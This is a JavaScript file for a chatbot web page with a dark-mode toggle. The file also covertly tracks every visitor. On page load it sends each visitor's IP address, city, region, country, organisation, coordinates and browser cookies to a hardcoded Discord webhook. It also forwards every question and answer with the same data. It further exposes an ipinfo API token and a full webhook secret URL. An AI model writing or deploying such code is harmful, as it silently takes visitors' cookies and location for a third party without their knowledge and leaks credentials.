const bannedUsers = [
    // Example banned users: { cookie: 'cookie1', ip: 'ip1' }
    { cookie: 'example_cookie1', ip: '' }, // Add banned users here
];

document.addEventListener('DOMContentLoaded', async function() {
    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d'); // Replace with your IPInfo API token
    const ipData = await ipInfoResponse.json();
    const visitorCookie = document.cookie || 'No cookies found';

    // Check if the visitor is banned
    const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);

    if (isBanned) {
        // Send webhook for banned user visit
        const bannedVisitWebhookMessage = {
            title: "Banned User Visit",
            description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: 16711680 // Red color to indicate a banned user
        };
        await sendWebhook(bannedVisitWebhookMessage);

        // Disable interaction and notify the user
        const responseContainer = document.getElementById("response");
        const sendButton = document.getElementById("send");
        sendButton.disabled = true;
        sendButton.innerText = "Blacklisted"; // Change button text for banned users
        responseContainer.innerText = "You have been blacklisted from using this service."; // Message for banned users
        return; // Exit the script if the user is banned
    }

    // Send webhook data on page visit for non-banned users
    const visitWebhookMessage = {
        title: "New Website Visit",
        description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
        `.trim(),
        color: Math.floor(Math.random() * 16777215) // Random color
    };

    // Send webhook for new visitor
    await sendWebhook(visitWebhookMessage);

    // Toggle dark mode functionality
    const toggleButton = document.getElementById('toggleButton');
    toggleButton.addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
    });

    // Handle question asking and response
    const inputBox = document.getElementById("question");
    const sendButton = document.getElementById("send");
    const responseContainer = document.getElementById("response");

    sendButton.addEventListener("click", async function() {
        const question = inputBox.value;
        if (!question) return;

        sendButton.disabled = true;
        sendButton.innerText = "...";

        const startTime = Date.now();
        const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
        const data = await response.json();
        const endTime = Date.now();

        const timeTaken = endTime - startTime;
        const formattedTime = formatDuration(timeTaken);

        const questionWebhookMessage = {
            title: "Question Asked",
            description: `
**Question:** ${question}
**Response:** ${data.cevap}
**Time Taken:** ${formattedTime}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: Math.floor(Math.random() * 16777215)
        };

        // Send webhook for the question
        await sendWebhook(questionWebhookMessage);

        responseContainer.innerText = data.cevap;
        sendButton.disabled = false;
        sendButton.innerText = "Send";
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289607577570906133/cBP3mPnNfj6SCgeYuFG8HsHIz22ZAnyCLo7Ga4L1125o1cmISP_Hv8gVcSjHA9Tj0LPj'; // Replace with your actual webhook URL
        const payload = {
            embeds: [embedMessage]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    }

    function formatDuration(ms) {
        if (ms < 1000) {
            return `${ms} ms`;
        } else if (ms < 60000) {
            return `${Math.floor(ms / 1000)} seconds`;
        } else {
            return `${Math.floor(ms / 60000)} minutes`;
        }
    }
});
